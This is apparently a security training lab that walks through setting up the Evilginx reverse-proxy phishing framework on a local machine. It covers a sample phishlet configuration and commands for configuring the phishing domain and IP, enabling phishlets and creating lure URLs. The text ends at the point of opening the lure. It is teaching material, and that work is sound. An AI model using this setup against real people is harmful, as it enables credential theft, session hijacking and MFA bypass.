# Evilginx

## Lab Goal

The goal of this lab is to introduce **Evilginx**, a reverse-proxy phishing framework that has been used in real-world phishing campaigns. In this lab, we will demonstrate how attackers can use it to capture usernames, passwords, and session tokens.

## In this lab you will

- Learn what **Evilginx** is
- Understand what reverse-proxy phishing means
- Learn the basic configuration of **Evilginx**
- Learn basics **Evilginx** functionalities

## What is Evilginx

**Evilginx** is a man-in-the-middle attack framework used in phishing campaigns for stealing login credentials along with session cookies/tokens. It works as a reverse proxy between the victim and the legitimate website server. One of the most important functionalities is that it's able to bypass some MFA methods. It is based on the open-source nginx web server, and its goal is to proxy web traffic through malicious sites created by the attacker. This is called an **Adversary In The Middle** attack.

## Evilginx Configuration Concepts

### Phishlets

A **Phishlet** is a configuration file written in YAML that defines how **Evilginx** proxies a specific target website. 

It tells the tool information such as:

- Which real domain should be proxied
- Which subdomains are required
- Which URLs are related to authentication
- Which cookies or tokens are important
- Which request or response values need to be rewritten

An example phishlet is the following:

```yaml
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'academy', orig_sub: 'academy', domain: 'breakdev.org', session: true, is_landing: true, auto_filter: true}
sub_filters:
  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
auth_tokens:
  - domain: '.academy.breakdev.org'
    keys: ['cookie_name']
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'academy.breakdev.org'
  path: '/evilginx-mastery'
```

So we have:

```
Evilginx = the framework
Phishlet = the configuration for a specific login service
```

Without a phishlet, **Evilginx** doesn't know how to properly proxy the target website.

**Phishlets** reside under the `/usr/share/evilginx2/phishlets` directory, if **Evilginx** is installed with `apt`, or in the github cloned folder under the `phishilets` directory, if it is installed with `git clone`. You can create new ones and move them to this directory, or you can edit existing ones.

### Domain Configuration

**Evilginx** needs a domain or subdomain to host the phishing proxy. This is the domain that the victim will see in the browser when opening the lure link.

The domain is a critical part of phishing, because even if the login page looks real, the domain will be different. If the victim is observant, they may be able to identify the phishing site from the URL. From a pentester/red teamer perspective, you must bear in mind that you have to give very similar domains, or domains that look legitimate.

Example domains:
```
login.example.com
sso.example.com
```

In this flow, the victim connects to our domain and then Evilginx proxies all the web traffic to the legitimate website.

### Lures

**Lures** are phishing links generated by Evilginx. It is the URL that the victim opens in the browser to reach the Evilginx proxy. Each lure is associated with a specific phishlet.

A lure can be delivered through email, SMS, social media message, or other communication channels. When the victim opens the lure in the browser, it connects to the Evilginx domain and then all the web traffic between the victim and the legitimate website comes through the Evilginx proxy.

**In this lab we will skip the delivery phase and open the lure directly in the browser.**

### TLS/HTTPS Certificates

Evilginx uses TLS/HTTPS Certificates to encrypt the web traffic between the victim's browser and the Evilginx domain. It has a built-in Automated Certificate Management Environment (ACME), which obtains free TLS certificates from Let's Encrypt.

This doesn't mean that the website is safe or legitimate! It just shows the HTTPS lock icon in the browser, just like the legitimate site.

**For the demonstration of this lab, we will use self-signed certificates**

### Captured Data and Session Cookies/Tokens

Evilginx collects a lot of data. The most significant are **username/password** and **session cookies/tokens**.

The raw credentials captured from the POST request, as we have defined them in the phishlet's `credential` section.

Session tokens are the most important part because if an attacker captures them, they can authenticate without entering the username, password, or MFA code.

## Fake Login Page Creation Using Evilginx

As we mentioned in the **Evilginx Configuration Concepts**, for each target website, we must create a phishlet so Evilginx knows how to proxy the traffic. For our example site, we have the phishlet ready in the `phishlets` directory, in the cloned Evilginx folder.

Run the following commands and start the Evilginx:

```bash
cd ~/BnB/evilginx/evilginx2
```

```bash
./build/evilginx -p ./phishlets/
```

![image](./attachments/img13.png)

![image](./attachments/img14.png)

When we start the Evilginx shows us the following useful information:

- The folder where it loads the phishlets
- The folder where it loads the configuration files
- The available phishlets. At this time, we can see our phishlet `cloudservice`

### Initial Configuration

- The first thing we have to configure is the base phishing domain. Phishlet subdomains will be created relative to this domain. In our case, the base domain is `cloudservice.com`, and the phishlet we have uses the phishing subdomain `official`. Hence, the lure hostname will be `official.cloudservice.com`.

To define the domain, execute the following command:

```bash
config domain cloudservice.com
```

![image](./attachments/img15.png)

>[!Note]
>
>The base domain should be configured before assigning and enabling the phishlet, because changing it resets previously configured phishlet hostnames.

- Secondly, we have to set the external IP. If we had set up Evilginx on a remote server, the external IP value would be set to the server's reachable IP address. In our case, where everything is running in the same VM, we set the loopback IP address. This address is used by the machines that communicate with the Evilginx server. In this lab, the lure hostname `official.cloudservice.com` resolves to **127.0.0.1**, allowing the browser running on the same VM to connect to Evilginx.

To define the external IP, execute the following command:

```bash
config ipv4 external 127.0.0.1
```

![image](./attachments/img16.png)

- Finally, as we mentioned above, we will use self-signed certificates. Hence, we will disable automatic certificate retrieval. Evilginx will load the certificate and private key from its local certificate directory (`~/.evilginx/crt/sites/official.cloudservice.com/`) instead of requesting a certificate from an external Certificate Authority.

Execute the following command:

```bash
config autocert off
```

![image](./attachments/img17.png)


Verify the changes by executing the following command:

```bash
config
```

![image](./attachments/img18.png)

>[!NOTE]
>
>Usually, the `dns_port` field is on port 53. In our case, everything is local, hence we can use another port because we don't use DNS (it is mapped in the `/etc/hosts`). Also, another service is running on this port.


### Using Phishlets

We can list the available phishlets with the following command:

```bash
phishlets
```

![image](./attachments/img19.png)

Before enabling a phishlet, we must set up its own hostname. This hostname must always be the same as the top-level domain you set up for Evilginx (in the **Initial Configuration** section above). This will be used for our lure creation in the next step. Multiple phishlets can share the same base domain, because they will be differentiated from their subdomains defined in each phishlet's `proxy_hosts` field.

Execute the following command to set up the hostname:

```bash
phishlets hostname cloudservice cloudservice.com
```

![image](./attachments/img20.png)

It's time to enable our phishlet. When a phishlet is enabled, its configuration is activated and allows Evilginx to use it when a lure is created.

Enable the phishlet with the following command:

```bash
phishlets enable <phishlet_name>
```

In our case:

```bash
phishlets enable cloudservice
```

![image](./attachments/img21.png)

If we list the phishlets again, we will see the changes.

![image](./attachments/img22.png)

Time to create some lures.

### Lures Creation

As mentioned above, each lure is associated with a specific phishlet. Let's create a lure for our `cloudservice` phishlet:

```bash
lures create <phishlet_name>
```

In our case:

```bash
lures create cloudservice
```

![image](./attachments/img23.png)

List the lures with the following command:

```bash
lures
```

![image](./attachments/img24.png)

As we can see, the lure for `cloudservice` phishlet has been generated with ID 0 and path `/ClrhJFuW`. From now on, we can refer to it by its ID.

The path is the endpoint that will appear when we get the phishing link from Evilginx. This path can be changed to whatever we want. To edit it, execute the following command:

```bash
lures edit <lure_ID> path /login
```

In our case:

```bash
lures edit 0 path /login
```

![image](./attachments/img25.png)

By listing again the lures, we will see the changed path.

![image](./attachments/img26.png)

We can delete a lure with the following command:

```bash
lures delete <lure_ID>
```

To get the lure URL execute the following command:

```bash
lures get-url 0
```

![image](./attachments/img27.png)

Now we have a phishing link. Let's open it in the browser.
